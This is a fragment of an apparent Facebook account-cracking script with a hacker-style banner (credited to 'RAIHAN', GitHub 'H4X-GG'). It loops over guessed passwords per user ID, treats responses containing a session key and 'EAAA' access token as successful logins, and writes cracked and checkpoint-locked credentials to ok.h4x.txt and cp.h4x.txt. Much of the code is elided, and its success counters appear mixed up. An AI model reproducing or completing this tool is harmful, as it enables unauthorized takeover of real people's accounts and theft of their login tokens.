...
\033[1;32m══════════════════════════════════════════════════════
\033[1;32m[💜]     \033[1;32mCREATED BY\33    :  \033[1;33mRAIHAN\33[0;m\033[1;32m
\033[1;32m[💜]     \033[1;32mFACEBOK      : \033[1;34m MD MEHU
\033[1;32m[💜]     \033[1;32mGITHUB       :  \033[1;35mH4X-GG
\033[1;32m[💜]     \033[1;32mTOOL VIRSION :  \033[1;36m1.0.4
...
class Main:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[92;1m[RAIHAN-🌚] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.h4x.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[91;1m   [RAIHAN-CP] %s | %s\033[94;1m        "%(uid, pw)) 
				self.ok.append("%s|%s"%(uid, pw))
				print('  User Agent :\033[1;96m %s'%(ua))
				open("cp.h4x.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue
